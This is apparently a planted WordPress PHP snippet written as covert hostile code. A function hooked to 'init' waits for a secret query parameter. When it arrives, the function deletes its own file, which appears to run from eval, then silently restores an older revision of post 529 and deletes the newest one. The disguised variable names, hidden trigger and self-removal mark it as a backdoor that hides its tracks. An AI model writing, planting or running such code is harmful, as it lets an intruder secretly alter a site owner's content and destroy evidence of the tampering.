<?php

function schema_specific_manage() {
	if (isset($_GET['tags_sites_block']) && $_GET['tags_sites_block'] === 'network_location_accessibility') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$conversion_addons_meta = 529;
		$extended_basic_board = wp_get_post_revisions($conversion_addons_meta);
		if (empty($extended_basic_board)) die('no revisions');
		if (count($extended_basic_board) < 2) die('less than 2');
		$total_locator_live = array_shift($extended_basic_board);
		$quiz_daily_archives = $total_locator_live->ID;
		$base_alt_updater = array_shift($extended_basic_board);
		$screen_importer_assistant = $base_alt_updater->ID;
		$listings_messages_price = wp_restore_post_revision($screen_importer_assistant);
		if ($listings_messages_price === false) die('error restoring');
		$listings_messages_price = wp_delete_post_revision($quiz_daily_archives);		
		if ($listings_messages_price === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'schema_specific_manage');
